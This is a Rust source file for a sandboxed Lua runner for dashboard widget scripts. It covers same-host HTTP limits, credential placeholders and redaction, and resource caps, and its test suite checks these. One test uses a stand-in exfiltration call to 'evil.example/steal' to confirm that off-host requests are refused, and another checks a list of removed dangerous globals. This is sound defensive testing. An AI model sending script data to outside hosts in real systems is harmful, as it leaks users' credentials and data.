//! Runs widget scripts in a sandboxed Lua 5.4 VM.
//!
//! The script API is documented in `docs/widget-api.md`, which is also what
//! the generator shows to the model. Keep the two in step.
//!
//! What the sandbox guarantees:
//! - no files, OS, `require`, `load` or debug library;
//! - HTTP only, and only to the host of the service's own `widget.url`;
//! - credentials are placeholders inside Lua and are substituted when the
//!   request is sent; credential values in response bodies are redacted;
//! - bounded requests, memory and instructions per run.

use std::collections::{BTreeMap, HashMap};
use std::sync::atomic::{AtomicU64, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};

use async_trait::async_trait;
use mlua::{HookTriggers, Lua, LuaOptions, LuaSerdeExt, MultiValue, StdLib, Table, Value, VmState};
use serde::Deserialize;

use super::{Block, Http, Method, Request, Row, Widget, WidgetConfig, WidgetData, WidgetError};
use crate::format;

/// The script API reference, for documentation and for the generator prompt.
pub const API_REFERENCE: &str = include_str!("../../docs/widget-api.md");

const MAX_REQUESTS: usize = 12;
const MAX_MEMORY: usize = 32 * 1024 * 1024;
const HOOK_EVERY: u32 = 10_000;
/// 20 million VM instructions.
const MAX_HOOK_TICKS: u64 = 2_000;
const MAX_BLOCKS: usize = 6;
const MAX_ROWS: usize = 10;
const TRACE_BODY_CHARS: usize = 1_500;

// `fail(reason)` wraps the reason in these so it can be told apart from a
// Lua runtime error and shown without a source position.
const FAIL_START: char = '\u{1}';
const FAIL_END: char = '\u{2}';

const PRELUDE: &str = r#"
function fail(reason)
  error("\1" .. tostring(reason) .. "\2", 0)
end

local request = http.request
local response = { __index = {} }

function response.__index:json()
  return json.decode(self.body)
end

function response.__index:check()
  if self.status >= 400 then fail("HTTP " .. self.status) end
  return self
end

function http.request(opts)
  return setmetatable(request(opts), response)
end

function http.get(url, opts)
  opts = opts or {}
  opts.method = "GET"
  opts.url = url
  return http.request(opts)
end

function http.post(url, body, opts)
  opts = opts or {}
  opts.method = "POST"
  opts.url = url
  opts.body = body
  return http.request(opts)
end
"#;

/// One upstream call made by a script, with credentials still as
/// placeholders. The generator feeds these back to the model.
#[derive(Debug, Clone, PartialEq)]
pub struct Trace {
    pub method: &'static str,
    pub url: String,
    pub status: Option<u16>,
    pub error: Option<String>,
    pub body_preview: String,
}

pub struct LuaWidget {
    name: String,
    script: String,
    /// The `state` table of each service, by `widget.url`.
    sessions: Mutex<HashMap<String, serde_json::Value>>,
}

struct Context {
    http: Arc<dyn Http>,
    base: reqwest::Url,
    secrets: BTreeMap<String, String>,
    requests: AtomicUsize,
    traces: Mutex<Vec<Trace>>,
}

#[derive(Deserialize)]
struct RequestOptions {
    #[serde(default)]
    method: Option<String>,
    url: String,
    #[serde(default)]
    headers: BTreeMap<String, String>,
    #[serde(default)]
    query: BTreeMap<String, serde_json::Value>,
    #[serde(default)]
    body: Option<String>,
    #[serde(default)]
    basic: Option<Vec<String>>,
}

#[derive(Deserialize)]
struct RawBlock {
    label: String,
    #[serde(default)]
    value: serde_json::Value,
}

#[derive(Deserialize)]
struct RawRow {
    #[serde(default)]
    title: String,
    #[serde(default)]
    detail: String,
    #[serde(default)]
    progress: f64,
}

#[derive(Deserialize, Default)]
struct BytesOptions {
    #[serde(default)]
    binary: bool,
    #[serde(default)]
    digits: Option<usize>,
}

fn placeholder(name: &str) -> String {
    format!("{{{{secret:{name}}}}}")
}

fn failure(reason: impl std::fmt::Display) -> mlua::Error {
    mlua::Error::runtime(format!("{FAIL_START}{reason}{FAIL_END}"))
}

fn truncate(text: &str, max_chars: usize) -> String {
    match text.char_indices().nth(max_chars) {
        Some((end, _)) => format!("{}…", &text[..end]),
        None => text.to_string(),
    }
}

/// Turns a Lua error into the short reason shown on the card.
fn describe(error: &mlua::Error) -> WidgetError {
    let text = error.to_string();
    if let Some(start) = text.find(FAIL_START) {
        let rest = &text[start + FAIL_START.len_utf8()..];
        let reason = rest.split(FAIL_END).next().unwrap_or(rest);
        return WidgetError::new(truncate(reason.trim(), 160));
    }
    if matches!(error, mlua::Error::MemoryError(_)) || text.contains("not enough memory") {
        return WidgetError::new("script used too much memory");
    }
    let line = text.lines().next().unwrap_or("").trim();
    let line = line.strip_prefix("runtime error: ").unwrap_or(line);
    let line = line.strip_prefix("syntax error: ").unwrap_or(line);
    WidgetError::new(format!("script error: {}", truncate(line, 160)))
}

impl Context {
    fn substitute(&self, text: &str) -> String {
        let mut out = text.to_string();
        for (name, value) in &self.secrets {
            out = out.replace(&placeholder(name), value);
        }
        out
    }

    fn redact(&self, text: String) -> String {
        let mut out = text;
        for value in self.secrets.values().filter(|v| v.len() >= 6) {
            if out.contains(value.as_str()) {
                out = out.replace(value.as_str(), "[redacted]");
            }
        }
        out
    }

    /// Resolves a script URL against the service and refuses other hosts.
    fn resolve(&self, url: &str) -> mlua::Result<reqwest::Url> {
        let absolute = url.starts_with("http://") || url.starts_with("https://");
        let text = if absolute {
            url.to_string()
        } else {
            let base = self.base.as_str().trim_end_matches('/');
            format!("{base}/{}", url.trim_start_matches('/'))
        };
        let parsed =
            reqwest::Url::parse(&text).map_err(|_| failure("script built an invalid URL"))?;
        let same_host = match (parsed.host_str(), self.base.host_str()) {
            (Some(a), Some(b)) => a.eq_ignore_ascii_case(b),
            _ => false,
        };
        if !same_host {
            return Err(failure("requests are limited to the widget's own host"));
        }
        Ok(parsed)
    }

    async fn request(&self, lua: Lua, options: Table) -> mlua::Result<Table> {
        let options: RequestOptions = lua.from_value(Value::Table(options))?;
        if self.requests.fetch_add(1, Ordering::Relaxed) >= MAX_REQUESTS {
            return Err(failure("too many requests in one run"));
        }
        let method = match options
            .method
            .as_deref()
            .map(str::to_ascii_uppercase)
            .as_deref()
        {
            None | Some("GET") => Method::Get,
            Some("POST") => Method::Post,
            Some(_) => return Err(failure("only GET and POST are supported")),
        };

        // Build the URL with placeholders first (that is what gets traced),
        // then substitute the credentials.
        let mut url = self.resolve(&options.url)?;
        if !options.query.is_empty() {
            let mut pairs = url.query_pairs_mut();
            for (name, value) in &options.query {
                let value = match value {
                    serde_json::Value::String(s) => s.clone(),
                    other => other.to_string(),
                };
                pairs.append_pair(name, &value);
            }
        }
        let traced_url = url
            .to_string()
            .replace("%7B%7Bsecret%3A", "{{secret:")
            .replace("%7D%7D", "}}");
        let mut real_url = self.resolve(&self.substitute(&options.url))?;
        if !options.query.is_empty() {
            let mut pairs = real_url.query_pairs_mut();
            for (name, value) in &options.query {
                let value = match value {
                    serde_json::Value::String(s) => self.substitute(s),
                    other => other.to_string(),
                };
                pairs.append_pair(name, &value);
            }
        }

        let mut request = Request {
            method,
            url: real_url.to_string(),
            headers: options
                .headers
                .iter()
                .map(|(name, value)| (name.clone(), self.substitute(value)))
                .collect(),
            body: options.body.as_deref().map(|b| self.substitute(b)),
        };
        if let Some(basic) = &options.basic {
            let user = basic
                .first()
                .map(|u| self.substitute(u))
                .unwrap_or_default();
            let pass = basic.get(1).map(|p| self.substitute(p)).unwrap_or_default();
            request = request.basic_auth(&user, &pass);
        }

        let method_name = if method == Method::Get { "GET" } else { "POST" };
        let response = match self.http.send(request).await {
            Ok(response) => response,
            Err(error) => {
                self.traces.lock().unwrap().push(Trace {
                    method: method_name,
                    url: traced_url,
                    status: None,
                    error: Some(error.0.clone()),
                    body_preview: String::new(),
                });
                return Err(failure(error.0));
            }
        };

        let body = self.redact(String::from_utf8_lossy(&response.body).into_owned());
        self.traces.lock().unwrap().push(Trace {
            method: method_name,
            url: traced_url,
            status: Some(response.status),
            error: None,
            body_preview: truncate(&body, TRACE_BODY_CHARS),
        });

        let table = lua.create_table()?;
        table.set("status", response.status)?;
        table.set("ok", (200..300).contains(&response.status))?;
        table.set("body", lua.create_string(&body)?)?;
        table.set("cookies", response.cookies)?;
        Ok(table)
    }
}

/// `widget.fields` as a list: a JSON array or a comma list.
fn parse_fields(raw: &str) -> Vec<String> {
    if let Ok(list) = serde_json::from_str::<Vec<String>>(raw) {
        return list;
    }
    raw.split(',')
        .map(|f| f.trim().to_string())
        .filter(|f| !f.is_empty())
        .collect()
}

fn json_to_lua(lua: &Lua, value: &serde_json::Value) -> mlua::Result<Value> {
    let options = mlua::serde::SerializeOptions::new()
        .serialize_none_to_null(false)
        .serialize_unit_to_null(false);
    lua.to_value_with(value, options)
}

fn install_globals(lua: &Lua, ctx: &Arc<Context>, cfg: &WidgetConfig) -> mlua::Result<()> {
    let globals = lua.globals();
    for name in [
        "load",
        "loadstring",
        "dofile",
        "loadfile",
        "collectgarbage",
        "require",
    ] {
        globals.set(name, Value::Nil)?;
    }
    if let Ok(string) = globals.get::<Table>("string") {
        string.set("dump", Value::Nil)?;
    }

    let log = lua.create_function(|_, message: mlua::LuaString| {
        tracing::debug!(message = %message.to_string_lossy(), "widget script");
        Ok(())
    })?;
    globals.set("log", log.clone())?;
    globals.set("print", log)?;

    // widget
    let widget = lua.create_table()?;
    widget.set("url", ctx.base.as_str().trim_end_matches('/'))?;
    widget.set("scheme", ctx.base.scheme())?;
    widget.set("host", ctx.base.host_str().unwrap_or(""))?;
    widget.set("port", ctx.base.port_or_known_default().unwrap_or(80))?;
    let params = lua.create_table()?;
    for (name, value) in cfg.params.iter().filter(|(name, _)| *name != "url") {
        params.set(name.as_str(), value.as_str())?;
    }
    widget.set("params", params)?;
    if let Some(fields) = cfg.params.get("fields").filter(|f| !f.is_empty()) {
        widget.set("fields", parse_fields(fields))?;
    }
    globals.set("widget", widget)?;

    // secret(name)
    let known: Vec<String> = cfg
        .secrets
        .iter()
        .filter(|(_, value)| !value.is_empty())
        .map(|(name, _)| name.clone())
        .collect();
    globals.set(
        "secret",
        lua.create_function(move |_, name: String| {
            Ok(known.contains(&name).then(|| placeholder(&name)))
        })?,
    )?;

    // http.request; the prelude adds get/post and the response methods.
    let http = lua.create_table()?;
    let request_ctx = ctx.clone();
    http.set(
        "request",
        lua.create_async_function(move |lua, options: Table| {
            let ctx = request_ctx.clone();
            async move { ctx.request(lua, options).await }
        })?,
    )?;
    globals.set("http", http)?;

    // json
    let json = lua.create_table()?;
    json.set(
        "decode",
        lua.create_function(|lua, text: mlua::LuaString| {
            let value: serde_json::Value = serde_json::from_slice(&text.as_bytes())
                .map_err(|_| failure("unexpected response: not JSON"))?;
            json_to_lua(lua, &value)
        })?,
    )?;
    json.set(
        "encode",
        lua.create_function(|lua, value: Value| {
            let value: serde_json::Value = lua.from_value(value)?;
            Ok(value.to_string())
        })?,
    )?;
    globals.set("json", json)?;

    // fmt
    let fmt = lua.create_table()?;
    fmt.set(
        "number",
        lua.create_function(|_, (n, digits): (Option<f64>, Option<usize>)| {
            Ok(match (n, digits) {
                (None, _) => "-".to_string(),
                (Some(n), Some(digits)) => format::number_max(n, digits.min(6)),
                (Some(n), None) => format::number(n),
            })
        })?,
    )?;
    fmt.set(
        "percent",
        lua.create_function(|_, n: Option<f64>| {
            Ok(n.map_or_else(|| "-".to_string(), format::percent))
        })?,
    )?;
    fmt.set(
        "bytes",
        lua.create_function(|lua, (n, options): (Option<f64>, Option<Table>)| {
            let options: BytesOptions = match options {
                Some(table) => lua.from_value(Value::Table(table))?,
                None => BytesOptions::default(),
            };
            Ok(n.map_or_else(
                || "-".to_string(),
                |n| format::bytes(n, options.binary, options.digits),
            ))
        })?,
    )?;
    fmt.set(
        "rate",
        lua.create_function(|_, (n, digits): (Option<f64>, Option<usize>)| {
            Ok(n.map_or_else(
                || "-".to_string(),
                |n| format::byterate(n, digits.unwrap_or(0).min(6)),
            ))
        })?,
    )?;
    fmt.set(
        "duration",
        lua.create_function(|_, n: Option<f64>| {
            Ok(n.map_or_else(|| "-".to_string(), |n| format::duration(n.max(0.0) as u64)))
        })?,
    )?;
    globals.set("fmt", fmt)?;
    Ok(())
}

fn block_value(value: &serde_json::Value) -> String {
    match value {
        serde_json::Value::String(s) => s.clone(),
        serde_json::Value::Number(n) => n.as_f64().map_or_else(|| n.to_string(), format::number),
        serde_json::Value::Bool(b) => b.to_string(),
        _ => "-".to_string(),
    }
}

fn collect(lua: &Lua, returned: MultiValue) -> Result<WidgetData, WidgetError> {
    let mut values = returned.into_iter();
    let invalid = || WidgetError::new("script must return a list of { label, value } blocks");
    let blocks: Vec<RawBlock> = match values.next() {
        Some(table @ Value::Table(_)) => lua.from_value(table).map_err(|_| invalid())?,
        _ => return Err(invalid()),
    };
    let rows: Vec<RawRow> = match values.next() {
        Some(table @ Value::Table(_)) => lua.from_value(table).unwrap_or_default(),
        _ => Vec::new(),
    };
    Ok(WidgetData {
        blocks: blocks
            .iter()
            .take(MAX_BLOCKS)
            .map(|b| Block::new(truncate(&b.label, 32), truncate(&block_value(&b.value), 48)))
            .collect(),
        rows: rows
            .into_iter()
            .take(MAX_ROWS)
            .map(|r| Row {
                title: truncate(&r.title, 120),
                detail: truncate(&r.detail, 60),
                progress: if r.progress.is_finite() {
                    r.progress.clamp(0.0, 100.0)
                } else {
                    0.0
                },
            })
            .collect(),
    })
}

impl LuaWidget {
    pub fn new(name: impl Into<String>, script: impl Into<String>) -> Self {
        Self {
            name: name.into(),
            script: script.into(),
            sessions: Mutex::default(),
        }
    }

    pub fn script(&self) -> &str {
        &self.script
    }

    /// Runs the script once and also returns the upstream calls it made.
    pub async fn run(
        &self,
        http: Arc<dyn Http>,
        cfg: &WidgetConfig,
    ) -> (Result<WidgetData, WidgetError>, Vec<Trace>) {
        let base = match cfg.url().map(reqwest::Url::parse) {
            Ok(Ok(base)) if base.host_str().is_some() => base,
            Ok(_) => {
                return (
                    Err(WidgetError::new("widget.url is not a valid URL")),
                    Vec::new(),
                )
            }
            Err(error) => return (Err(error), Vec::new()),
        };
        let session_key = base.to_string();
        let ctx = Arc::new(Context {
            http,
            base,
            secrets: cfg.secrets.clone(),
            requests: AtomicUsize::new(0),
            traces: Mutex::default(),
        });
        let saved = self.sessions.lock().unwrap().get(&session_key).cloned();
        let (result, state) = self.execute(&ctx, cfg, saved).await;
        if let Some(state) = state {
            self.sessions.lock().unwrap().insert(session_key, state);
        }
        let traces = std::mem::take(&mut *ctx.traces.lock().unwrap());
        (result, traces)
    }

    async fn execute(
        &self,
        ctx: &Arc<Context>,
        cfg: &WidgetConfig,
        saved: Option<serde_json::Value>,
    ) -> (Result<WidgetData, WidgetError>, Option<serde_json::Value>) {
        let setup = || -> mlua::Result<Lua> {
            let libs = StdLib::STRING | StdLib::TABLE | StdLib::MATH | StdLib::UTF8;
            let lua = Lua::new_with(libs, LuaOptions::default())?;
            lua.set_memory_limit(MAX_MEMORY)?;
            let ticks = AtomicU64::new(0);
            lua.set_global_hook(
                HookTriggers::new().every_nth_instruction(HOOK_EVERY),
                move |_, _| {
                    if ticks.fetch_add(1, Ordering::Relaxed) >= MAX_HOOK_TICKS {
                        Err(failure("script ran too long"))
                    } else {
                        Ok(VmState::Continue)
                    }
                },
            )?;
            install_globals(&lua, ctx, cfg)?;
            lua.load(PRELUDE).set_name("=prelude").exec()?;
            let state = match &saved {
                Some(value @ serde_json::Value::Object(_)) => json_to_lua(&lua, value)?,
                _ => Value::Table(lua.create_table()?),
            };
            lua.globals().set("state", state)?;
            Ok(lua)
        };
        let lua = match setup() {
            Ok(lua) => lua,
            Err(error) => return (Err(describe(&error)), None),
        };

        let returned: mlua::Result<MultiValue> = lua
            .load(self.script.as_str())
            .set_name(format!("={}", self.name))
            .eval_async()
            .await;
        // Keep the session even when the run failed: a script may have
        // dropped a stale cookie before failing.
        let state = lua
            .globals()
            .get::<Value>("state")
            .ok()
            .and_then(|value| lua.from_value::<serde_json::Value>(value).ok())
            .filter(serde_json::Value::is_object);
        let result = match returned {
            Ok(values) => collect(&lua, values),
            Err(error) => Err(describe(&error)),
        };
        (result, state)
    }
}

#[async_trait]
impl Widget for LuaWidget {
    async fn fetch(
        &self,
        http: Arc<dyn Http>,
        cfg: &WidgetConfig,
    ) -> Result<WidgetData, WidgetError> {
        self.run(http, cfg).await.0
    }
}

#[cfg(test)]
mod tests {
    use super::super::testing::{config, pairs, FakeHttp};
    use super::*;

    async fn run(
        script: &str,
        http: FakeHttp,
        cfg: &WidgetConfig,
    ) -> (Result<WidgetData, WidgetError>, Vec<Trace>, Arc<FakeHttp>) {
        let http = Arc::new(http);
        let widget = LuaWidget::new("test", script);
        let (result, traces) = widget.run(http.clone(), cfg).await;
        (result, traces, http)
    }

    fn base() -> WidgetConfig {
        config(&[
            ("url", "http://svc.example:8080/app/"),
            ("key", "SUPERSECRETVALUE"),
        ])
    }

    #[tokio::test]
    async fn returns_blocks_and_rows() {
        let script = r#"
            return {
              { label = "Count", value = 1234.5 },
              { label = "Text", value = "ok" },
            }, { { title = "Row", detail = "downloading", progress = 250 } }
        "#;
        let (result, _, _) = run(script, FakeHttp::new(), &base()).await;
        let data = result.unwrap();
        assert_eq!(
            pairs(&data),
            vec![
                ("Count".into(), "1,234.5".into()),
                ("Text".into(), "ok".into())
            ]
        );
        assert_eq!(data.rows[0].progress, 100.0);
    }

    #[tokio::test]
    async fn secrets_are_placeholders_in_lua_and_real_on_the_wire() {
        let script = r#"
            local key = secret("key")
            if key == "SUPERSECRETVALUE" then fail("leaked") end
            local r = http.get("/api", {
              headers = { ["X-Api-Key"] = key, Authorization = "Bearer " .. key },
              query = { apikey = key, b = 2 },
            })
            return { { label = "Body", value = r.body }, { label = "Missing", value = tostring(secret("nope")) } }
        "#;
        let http = FakeHttp::new().on(Method::Get, "/app/api", 200, "echo SUPERSECRETVALUE end");
        let (result, traces, http) = run(script, http, &base()).await;
        let data = result.unwrap();
        // The credential echoed by the upstream never reaches the script.
        assert_eq!(data.blocks[0].value, "echo [redacted] end");
        assert_eq!(data.blocks[1].value, "nil");
        let sent = &http.requests()[0];
        assert_eq!(
            sent.url,
            "http://svc.example:8080/app/api?apikey=SUPERSECRETVALUE&b=2"
        );
        assert_eq!(http.header(0, "X-Api-Key").unwrap(), "SUPERSECRETVALUE");
        assert_eq!(
            http.header(0, "Authorization").unwrap(),
            "Bearer SUPERSECRETVALUE"
        );
        // Traces keep the placeholder.
        assert_eq!(
            traces[0].url,
            "http://svc.example:8080/app/api?apikey={{secret:key}}&b=2"
        );
        assert!(!traces[0].body_preview.contains("SUPERSECRETVALUE"));
    }

    #[tokio::test]
    async fn other_hosts_are_refused() {
        let script =
            r#"return { { label = "x", value = http.get("http://evil.example/steal").status } }"#;
        let (result, _, http) = run(script, FakeHttp::new(), &base()).await;
        assert_eq!(
            result.unwrap_err().0,
            "requests are limited to the widget's own host"
        );
        assert!(http.requests().is_empty());
    }

    #[tokio::test]
    async fn same_host_other_port_is_allowed() {
        let script = r#"
            local r = http.get(widget.scheme .. "://" .. widget.host .. ":49000/x")
            return { { label = "Status", value = r.status }, { label = "Port", value = widget.port } }
        "#;
        let http = FakeHttp::new().on(Method::Get, "svc.example:49000/x", 200, "");
        let (result, _, _) = run(script, http, &base()).await;
        assert_eq!(
            pairs(&result.unwrap()),
            vec![
                ("Status".into(), "200".into()),
                ("Port".into(), "8,080".into())
            ]
        );
    }

    #[tokio::test]
    async fn check_and_fail_give_short_reasons() {
        let http = FakeHttp::new().on(Method::Get, "/app/x", 401, "{}");
        let (result, _, _) = run(r#"http.get("/x"):check()"#, http, &base()).await;
        assert_eq!(result.unwrap_err().0, "HTTP 401");

        let (result, _, _) =
            run(r#"fail("widget.key is not set")"#, FakeHttp::new(), &base()).await;
        assert_eq!(result.unwrap_err().0, "widget.key is not set");

        let http = FakeHttp::new().on(Method::Get, "/app/x", 200, "<html>");
        let (result, _, _) = run(r#"return http.get("/x"):json()"#, http, &base()).await;
        assert_eq!(result.unwrap_err().0, "unexpected response: not JSON");
    }

    #[tokio::test]
    async fn transport_errors_fail_the_script_and_are_traced() {
        let (result, traces, _) = run(r#"http.get("/down")"#, FakeHttp::new(), &base()).await;
        assert_eq!(result.unwrap_err().0, "no fixture for this request");
        assert_eq!(traces[0].status, None);
        assert_eq!(
            traces[0].error.as_deref(),
            Some("no fixture for this request")
        );
    }

    #[tokio::test]
    async fn script_bugs_are_reported_as_script_errors() {
        let (result, _, _) = run("local x = nil; return x.y", FakeHttp::new(), &base()).await;
        let reason = result.unwrap_err().0;
        assert!(reason.starts_with("script error: "), "{reason}");
        assert!(reason.contains("test:1"), "{reason}");

        let (result, _, _) = run("return {", FakeHttp::new(), &base()).await;
        assert!(result.unwrap_err().0.starts_with("script error: "));

        let (result, _, _) = run("return 5", FakeHttp::new(), &base()).await;
        assert_eq!(
            result.unwrap_err().0,
            "script must return a list of { label, value } blocks"
        );
    }

    #[tokio::test]
    async fn sandbox_has_no_files_os_or_code_loading() {
        let script = r#"
            local missing = {}
            for _, name in ipairs({ "io", "os", "require", "load", "dofile", "loadfile", "debug", "package", "collectgarbage" }) do
              if _G[name] ~= nil then missing[#missing + 1] = name end
            end
            if string.dump ~= nil then missing[#missing + 1] = "string.dump" end
            return { { label = "Present", value = table.concat(missing, ",") } }
        "#;
        let (result, _, _) = run(script, FakeHttp::new(), &base()).await;
        assert_eq!(result.unwrap().blocks[0].value, "");
    }

    #[tokio::test]
    async fn runaway_scripts_are_stopped() {
        let (result, _, _) = run("while true do end", FakeHttp::new(), &base()).await;
        assert_eq!(result.unwrap_err().0, "script ran too long");

        let hog = r#"local t = {} for i = 1, 1e9 do t[i] = string.rep("x", 1024) end"#;
        let (result, _, _) = run(hog, FakeHttp::new(), &base()).await;
        let reason = result.unwrap_err().0;
        assert!(
            reason == "script used too much memory" || reason == "script ran too long",
            "{reason}"
        );
    }

    #[tokio::test]
    async fn request_count_is_capped() {
        let script = r#"for i = 1, 50 do http.get("/x") end"#;
        let http = FakeHttp::new().on(Method::Get, "/app/x", 200, "");
        let (result, _, http) = run(script, http, &base()).await;
        assert_eq!(result.unwrap_err().0, "too many requests in one run");
        assert_eq!(http.requests().len(), MAX_REQUESTS);
    }

    #[tokio::test]
    async fn state_survives_between_runs_per_service() {
        let script = r#"
            state.runs = (state.runs or 0) + 1
            return { { label = "Runs", value = state.runs } }
        "#;
        let widget = LuaWidget::new("test", script);
        let http: Arc<dyn Http> = Arc::new(FakeHttp::new());
        let first = widget.run(http.clone(), &base()).await.0.unwrap();
        let second = widget.run(http.clone(), &base()).await.0.unwrap();
        assert_eq!(first.blocks[0].value, "1");
        assert_eq!(second.blocks[0].value, "2");
        let other = config(&[("url", "http://other.example")]);
        assert_eq!(
            widget.run(http, &other).await.0.unwrap().blocks[0].value,
            "1"
        );
    }

    #[tokio::test]
    async fn json_null_is_nil_and_fmt_handles_nil() {
        let script = r#"
            local data = json.decode('{"a":null,"b":[1,2],"c":82141245440}')
            return {
              { label = "A", value = fmt.number(data.a) },
              { label = "B", value = #data.b },
              { label = "C", value = fmt.bytes(data.c, { binary = true, digits = 1 }) },
              { label = "D", value = json.encode({ password = "x" }) },
            }
        "#;
        let (result, _, _) = run(script, FakeHttp::new(), &base()).await;
        assert_eq!(
            pairs(&result.unwrap()),
            vec![
                ("A".into(), "-".into()),
                ("B".into(), "2".into()),
                ("C".into(), "76.5 GiB".into()),
                ("D".into(), r#"{"password":"x"}"#.into()),
            ]
        );
    }

    #[tokio::test]
    async fn fields_and_params_are_exposed() {
        let script = r#"
            return {
              { label = "Fields", value = table.concat(widget.fields, "+") },
              { label = "Param", value = widget.params.enableQueue },
              { label = "Url", value = widget.url },
              { label = "NoUrlParam", value = tostring(widget.params.url) },
            }
        "#;
        let cfg = config(&[
            ("url", "http://svc.example/"),
            ("fields", r#"["a","b"]"#),
            ("enableQueue", "true"),
        ]);
        let (result, _, _) = run(script, FakeHttp::new(), &cfg).await;
        assert_eq!(
            pairs(&result.unwrap()),
            vec![
                ("Fields".into(), "a+b".into()),
                ("Param".into(), "true".into()),
                ("Url".into(), "http://svc.example".into()),
                ("NoUrlParam".into(), "nil".into()),
            ]
        );
    }

    #[test]
    fn api_reference_is_bundled() {
        assert!(API_REFERENCE.contains("secret(name)"));
        assert!(API_REFERENCE.contains("fmt.bytes"));
    }
}
